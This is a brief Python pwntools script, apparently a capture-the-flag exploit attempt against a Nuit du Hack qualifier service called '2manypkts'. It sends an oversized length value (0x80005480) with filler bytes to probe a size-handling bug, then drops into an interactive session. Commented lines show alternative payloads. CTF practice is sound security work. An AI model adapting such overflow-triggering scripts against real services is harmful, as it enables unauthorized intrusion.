from pwn import *
import time

#s = remote('192.168.0.85',1234)
s = remote('2manypkts-v1.quals.nuitduhack.com',30303)
s.recvuntil('Welcome to the data eater')
def make(type,size,dat):
  s.send(type+'\n')
  s.recvuntil(type)
  s.send(str(size)+'\n')
  time.sleep(1)
  #for i in xrange(16):s.send(dat)
  s.send(dat)
make('long unsigned',0x80005480,'\x41'*0x4)
#make('long unsigned',0x410,'\x41'*0x410)
#s.send('A'*0x100000)
s.interactive()
